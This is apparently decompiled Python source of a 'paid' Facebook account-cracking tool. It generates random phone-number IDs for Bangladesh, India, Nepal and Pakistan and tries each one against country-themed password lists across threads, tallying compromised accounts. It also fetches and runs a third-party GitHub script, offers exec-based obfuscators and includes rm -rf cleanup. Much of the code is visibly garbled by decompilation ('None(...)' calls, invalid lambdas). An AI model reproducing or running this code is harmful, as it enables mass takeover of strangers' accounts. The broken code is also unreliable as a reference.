logo = ' \n\x1b[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n║\x1b[1;97m\x1b[42m[●▬▬▬▬▬๑🌸🕌\x1b[1;97m\x1b[42m[Bismillahir \x1b[38;5;208m\x1b[1;97mRahmanir Rahim]🕌🌸๑▬▬▬▬▬▬●\x1b[1;97m]\x1b[0m\x1b[1;92m║\n\x1b[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n\x1b[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n\x1b[1;92m┃ ┳┳┓┳┓ ┏┓┓ ┏┓┳┓┏┓ ┃\x1b[1;92m ᎪႮͲᎻϴᎡ  \x1b[1;92m:\x1b[1;92mMD SHOVON SHARIER SOHAG\x1b[1;92m ┃\n\x1b[1;92m┃ ┃┃┃┣┫ ┣┫┃ ┃┃┃┃┣  ┃\x1b[1;92m FACEBOOK\x1b[1;92m:\x1b[1;92mMD SHOVON SHARIER SOHAG\x1b[1;92m ┃\n\x1b[1;92m┃ ┛ ┗┛┗•┛┗┗┛┗┛┛┗┗┛ ┃\x1b[1;92m GITHUB  \x1b[1;92m:\x1b[1;92mMR-ALON                 \x1b[1;92m┃\n\x1b[1;92m┣━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┫\n\x1b[1;92m┃\x1b[1;92mͲOOL:\x1b[1;92mFILE & RANDOM\x1b[1;92m\x1b[1;92m┃ \x1b[1;92mՏTATUS\x1b[1;92m ░▒𝐏𝐀𝐈𝐃▒░\x1b[1;92m ┃\x1b[1;92m VERSION\x1b[1;92m:\x1b[1;92mV-10.1\x1b[1;92m ┃\n\x1b[1;92m╚━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━╝\n\x1b[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n║\x1b[1;97m\x1b[42m[<🕌Assalamualaikum\x1b[38;5;208m"\x1b[1;97mMind It,\'You Will Never Alone🕌>\x1b[1;97m]\x1b[0m\x1b[1;92m║\n\x1b[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝'
os.system('clear')
print(logo)
uname = input('\x1b[1;91m[\x1b[1;92m•\x1b[1;91m]\x1b[1;92m YOUR NAME \x1b[1;91m: \x1b[1;35m')

def back():
    login()

CorrectUsername = 'F'
key = 'true'
if key == 'true':
    username = input('\x1b[1;91m[\x1b[1;92m•\x1b[1;91m]\x1b[1;92m\x1b[1;96m•────➤\x1b[1;92mENTER YOUR ACCESS KEY \x1b[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
        print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\x1b[0;97m[•]\x1b[1;32m LOGGED IN PAID TOOL SUCCESSFULLY')
        time.sleep(1)
        clear()
        key = 'false'

class jalan:
    
    def __init__(self, z):
        for e in z + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.04)
            return None



def menu():
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m+\x1b[1;31m] \x1b[1;92mUSER NAME\x1b[1;91m :\x1b[1;96m ' + uname)
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[1;31m[\x1b[1;37m1\x1b[1;31m] \x1b[1;92mFILE-CRACK[💚] ')
    print('\x1b[1;31m[\x1b[1;37m2\x1b[1;31m] \x1b[1;92mRANDOM-CRACK[💚]  ')
    print('\x1b[1;31m[\x1b[1;37m3\x1b[1;31m] \x1b[1;92mOLD-ID-CLONING')
    print('\x1b[1;31m[\x1b[1;37m4\x1b[1;31m] \x1b[1;92mPYTHON-ENCODE ')
    print('\x1b[1;31m[\x1b[1;37m5\x1b[1;31m] \x1b[1;92mFILE-MAKING')
    print('\x1b[1;31m[\x1b[1;37m6\x1b[1;31m] \x1b[1;92mSUBSCRIBE TO YOUTUBE CHANNEL')
    print('\x1b[1;31m[\x1b[1;37m0\x1b[1;31m] \x1b[1;95mEXIT[💚]')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    ALONE = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m] \x1b[1;32mCHOOSE\x1b[1;37m :\x1b[0;95m ')
    clear()
    print(logo)
    if ALONE in ('1',):
        crack_file()
        return None
    if None in ('2', '02'):
        randm()
        return None
    if None in ('3', '03'):
        _old_()
        return None
    if None in ('4', '04'):
        enc()
        return None
    if None in ('5', '05'):
        Create_M1()
        return None
    if None in ('6', '06'):
        os.system('xdg-open https://www.youtube.com/@sohag1mdream')
        os.system('python nono.py')
        return None
    if None in ('0',):
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\x1b[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
        return None
    None('\x1b[0;97m=================')
    animation(' [×] SELECT CORRECTLY ')
    back()


def randm():
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m1\x1b[1;31m] \x1b[1;32mBANGLADESH CLONING ')
    print('\x1b[1;31m[\x1b[1;37m2\x1b[1;31m] \x1b[1;32mINDIA CLONING ')
    print('\x1b[1;31m[\x1b[1;37m3\x1b[1;31m] \x1b[1;32mNEPAL CLONING ')
    print('\x1b[1;31m[\x1b[1;37m4\x1b[1;31m] \x1b[1;32mPAKISTAN CLONING ')
    print('\x1b[1;31m[\x1b[1;37m5\x1b[1;31m] \x1b[1;32mAFGHANISTAN CLONING ')
    print('\x1b[1;31m[\x1b[1;37m0\x1b[1;31m] \x1b[1;32mBACK TO MENU ')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    option = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE : ')
    if option in ('1', 'A'):
        bd()
        return None
    if None in ('2', 'B'):
        india()
        return None
    if None in ('3', 'C'):
        nepal()
        return None
    if None in ('4', 'D'):
        pakistan()
        return None
    if None in ('5', 'E'):
        afghanistan()
        return None
    if None in ('0', '00'):
        menu()
        return None
    None(f'''{B}❲{A}={B}❳{G} BYE BYE ''')


def Create_M1():
    os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
    os.system('cd && cd FILE ;python V33.py')


def _old_():
    user = []
    print('\x1b[1;31m[\x1b[1;37m☂\x1b[1;31m] \x1b[1;37mEXAMPLE    \x1b[1;33m : \x1b[1;37m3000/5000/10000/99999')
    print('\r\x1b[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m INPUT \x1b[1;31m\x1b[1;37m: ')
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m1\x1b[1;31m] \x1b[1;37mMETHOD (BEST-1) ')
    print('\r\x1b[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    ask = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m] INPUT : ')
    if ask in ('1',):
        star = '10000'
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 0x2540BE3FFL)))
            user.append(data)
            star = '100000'
            for i in range(int(limit)):
                data = str(random.choice(range(100000000, 999999999)))
                user.append(data)
                skber = ALONE(max_workers = 40)
                os.system('clear')
                print(logo)
                print(f'''\x1b[38;5;196m[\x1b[38;5;46m☂\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46m METHOD : M\x1b[38;5;46m{ask}''')
                print('\x1b[38;5;196m[\x1b[38;5;46m☂\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
                print('\r\x1b[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                for mal in user:
                    uid = star + mal
                    skber.submit(login, uid)
                    None(None, None)
                    return None
                    if not None:
                        pass

loop = 0
oks = []
cps = []

def enc():
    clear()
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m1\x1b[1;31m]\x1b[1;32m ENCODE MARSHAL ')
    print('\x1b[1;31m[\x1b[1;37m2\x1b[1;31m]\x1b[1;32m ENCODE BASE64  ')
    print('\x1b[1;31m[\x1b[1;37m3\x1b[1;31m]\x1b[1;32m ENCODE ZLIB    ')
    print('\x1b[1;31m[\x1b[1;37m0\x1b[1;31m]\x1b[1;32m Exit ')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    option = input('\x1b[1;93m [?] CHOICE MENU : ')
    if option in ('a', '1'):
        marshal_enc()
        return None
    if None in ('b', '2'):
        base64_enc()
        return None
    if None in ('c', '3'):
        zlib_enc()
        return None
    None(' TOOL EXITED :/')


def marshal_enc():
    clear()
    print(logo)
    file = input('\x1b[1;37mENTER SOURCE FILE NAME : ')
    filex = input('\x1b[1;37mENTER OUTPUT FILE NAME : ')
    file_open = open(file, 'r').read()
    exit(' FILE NOT FOUND ERROR !!')
    compilex = compile(file_open, 'dg', 'exec')
    dump = marshal.dumps(compilex)
    run_code = f'''import marshal \nexec(marshal.loads({dump}))'''
    out_put = open(filex, 'w')
    out_put.write('#-------------------------------------##-------------------------------------#\n# ENCRYPTED BY : ALONE KING\n# GITHUB : https://github.com/ALONE3987\n#-------------------------------------##-------------------------------------#\n\n')
    out_put.write(run_code)
    out_put.close()
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' [✓✓] ENCRYPTION COMPLETE :/ ')
    print(' [✓✓] OUTPUT FILE SAVE AS : ' + filex)
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def base64_enc():
    clear()
    print(logo)
    input_file = input('\x1b[1;37mENTER SOURCE FILE PATH : ')
    output_file = input('\x1b[1;37mENTER OUTPUT FILE PATH : ')
    file_open = open(input_file, 'r').read()
    exit(' FILE NOT FOUND ERROR !!')
    compile = base64.b64encode(file_open.encode())
    run_code = f'''import base64\nexec(base64.b64decode({compile}))'''
    out_put = open(output_file, 'w')
    out_put.write('#-------------------------------------##-------------------------------------#\n# ENCRYPTED BY : ALONE KING\n# GITHUB : https://github.com/ALONE3987\n#-------------------------------------##-------------------------------------#\n\n')
    out_put.write(run_code)
    out_put.close()
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' [✓✓] ENCRYPTION COMPLETE :/')
    print(' [✓✓] ENC FILE SAVE AS : ' + output_file)
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def zlib_enc():
    clear()
    print(logo)
    src = input('\x1b[1;37mENTER SOURCE FILE PATH : ')
    save_file = input('\x1b[1;37mENTER OUTPUT FILE PATH : ')
    src_file = open(src, 'r').read()
    exit(' FILE NOT FOUND !!')
    compile_zlib = zlib.compress(src_file.encode())
    run_code = f'''import zlib\nexec(zlib.decompress({compile_zlib}).decode())'''
    out_put = open(save_file, 'w')
    out_put.write('#-------------------------------------##-------------------------------------#\n# ENCRYPTED BY : ALONE KING\n# GITHUB : https://github.com/ALONE3987\n#-------------------------------------##-------------------------------------#\n\n')
    out_put.write(run_code)
    out_put.close()
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' [✓✓] ENCRYPTION COMPLETE :/')
    print(' [✓✓] ENC FILE SAVE AS : ' + save_file)
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def bd():
    user = []
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m≈\x1b[1;31m]\x1b[1;37m EXAMPLE : 017 | 019 | 018 | 016 ')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    code = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : ')
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m≈\x1b[1;31m]\x1b[1;37m EXAMPLE : 3000 | 5000 | 10000 | 99999 ')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : '))
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m1\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m1\x1b[38;5;196m)\n\x1b[1;31m[\x1b[1;37m2\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m2\x1b[38;5;196m)\n\x1b[1;31m[\x1b[1;37m3\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m3\x1b[38;5;196m)')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    mthd = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : ')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(8)())
        user.append(nmp)
        habib = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(logo)
        print(f'''\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \x1b[1;37m:\x1b[38;5;46m {code} ''')
        print(f'''\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \x1b[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \x1b[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ''')
        print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for psx in user:
            uid = code + psx
            passlist = [
                psx,
                uid,
                '123456',
                'bangladesh',
                'i love you',
                'nusrat',
                'sumaiya',
                'mababa']
            if mthd in ('1', '01'):
                habib.submit(rndm1, uid, passlist)
            if mthd in ('2', '02'):
                habib.submit(rndm2, uid, passlist)
            if mthd in ('3', '03'):
                habib.submit(rndm3, uid, passlist)
            None(None, None)
            if not ''.join:
                pass
    print('\x1b[1;37m')
    print('\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : ' + str(len(oks)))
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : ' + str(len(cps)))
    print('\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
    menu()


def india():
    user = []
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m≈\x1b[1;31m]\x1b[1;37m EXAMPLE : 91639 | 91934 | 91902 | 91937 ')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    code = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : ')
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m≈\x1b[1;31m]\x1b[1;37m EXAMPLE : 3000 | 5000 | 10000 | 99999 ')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : '))
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m1\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m1\x1b[38;5;196m)\n\x1b[1;31m[\x1b[1;37m2\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m2\x1b[38;5;196m)\n\x1b[1;31m[\x1b[1;37m3\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m3\x1b[38;5;196m)')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    mthd = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : ')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        habib = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(logo)
        print(f'''\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \x1b[1;37m:\x1b[38;5;46m {code} ''')
        print(f'''\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \x1b[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \x1b[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ''')
        print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for psx in user:
            uid = code + psx
            passlist = [
                psx,
                uid[:8],
                '57273200',
                '59039200',
                '57575751']
            if mthd in ('1', '01'):
                habib.submit(rndm1, uid, passlist)
            if mthd in ('2', '02'):
                habib.submit(rndm2, uid, passlist)
            if mthd in ('3', '03'):
                habib.submit(rndm3, uid, passlist)
            None(None, None)
            if not ''.join:
                pass
    print('\x1b[1;37m')
    print('\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : ' + str(len(oks)))
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : ' + str(len(cps)))
    print('\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
    menu()


def nepal():
    user = []
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m≈\x1b[1;31m]\x1b[1;37m EXAMPLE : 9815 | 9814 | 9861 | 9840 ')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    code = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : ')
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m≈\x1b[1;31m]\x1b[1;37m EXAMPLE : 3000 | 5000 | 10000 | 99999 ')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : '))
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m1\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m1\x1b[38;5;196m)\n\x1b[1;31m[\x1b[1;37m2\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m2\x1b[38;5;196m)\n\x1b[1;31m[\x1b[1;37m3\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m3\x1b[38;5;196m)')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    mthd = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : ')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(6)())
        user.append(nmp)
        habib = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(logo)
        print(f'''\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \x1b[1;37m:\x1b[38;5;46m {code} ''')
        print(f'''\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \x1b[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \x1b[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ''')
        print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for psx in user:
            uid = code + psx
            passlist = [
                uid,
                psx,
                uid[:8],
                uid[:7],
                uid[:6],
                'nepal12',
                'nepal123',
                'nepal1234',
                'nepal12345',
                'maya123',
                'kathmandu',
                'pokhara',
                'tamang',
                'maya1234',
                'tamang123',
                'tamang12345',
                'nepal@123',
                'kathmandu123']
            if mthd in ('1', '01'):
                habib.submit(rndm1, uid, passlist)
            if mthd in ('2', '02'):
                habib.submit(rndm2, uid, passlist)
            if mthd in ('3', '03'):
                habib.submit(rndm3, uid, passlist)
            None(None, None)
            if not ''.join:
                pass
    print('\x1b[1;37m')
    print('\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : ' + str(len(oks)))
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : ' + str(len(cps)))
    print('\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
    menu()


def pakistan():
    user = []
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m≈\x1b[1;31m]\x1b[1;37m EXAMPLE : 0306 | 0335 | 0315 | 0345 ')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    code = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : ')
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m≈\x1b[1;31m]\x1b[1;37m EXAMPLE : 3000 | 5000 | 10000 | 99999 ')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : '))
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m1\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m1\x1b[38;5;196m)\n\x1b[1;31m[\x1b[1;37m2\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m2\x1b[38;5;196m)\n\x1b[1;31m[\x1b[1;37m3\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m3\x1b[38;5;196m)')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    mthd = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : ')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        habib = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(logo)
        print(f'''\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \x1b[1;37m:\x1b[38;5;46m {code} ''')
        print(f'''\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \x1b[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \x1b[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ''')
        print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for psx in user:
            uid = code + psx
            passlist = [
                psx,
                uid,
                'khankhan',
                'khan1122',
                'ali12345',
                'khanbaba',
                'pakistan',
                'khan12345',
                'ali1122',
                'khankhan12345',
                'khan',
                'baloch']
            if mthd in ('1', '01'):
                habib.submit(rndm1, uid, passlist)
            if mthd in ('2', '02'):
                habib.submit(rndm2, uid, passlist)
            if mthd in ('3', '03'):
                habib.submit(rndm3, uid, passlist)
            None(None, None)
            if not ''.join:
                pass
    print('\x1b[1;37m')
    print('\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : ' + str(len(oks)))
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : ' + str(len(cps)))
    print('\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
    menu()


def afghanistan():
    user = []
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m≈\x1b[1;31m]\x1b[1;37m EXAMPLE : 9340 | 9360 | 9330 | 9350')
